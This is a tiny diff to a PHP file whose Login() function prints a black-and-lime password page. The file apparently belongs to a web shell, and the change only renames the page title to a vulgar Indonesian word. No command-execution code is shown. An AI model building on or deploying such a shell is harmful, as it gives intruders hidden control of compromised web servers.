@@ -10,7 +10,7 @@ $_COOKIE = VEstripslashes($_COOKIE); }
 function Login() {
   die("<html>
   <head>
-  <title>CITI69</title>
+  <title>KONTOLKUDA</title>
   </head>
   <style>html{background-color:black;color:lime;}input{background-color:transparent;box-shadow: 0 0 10px lime;color:white;border-color:white;}</style>
   <body>
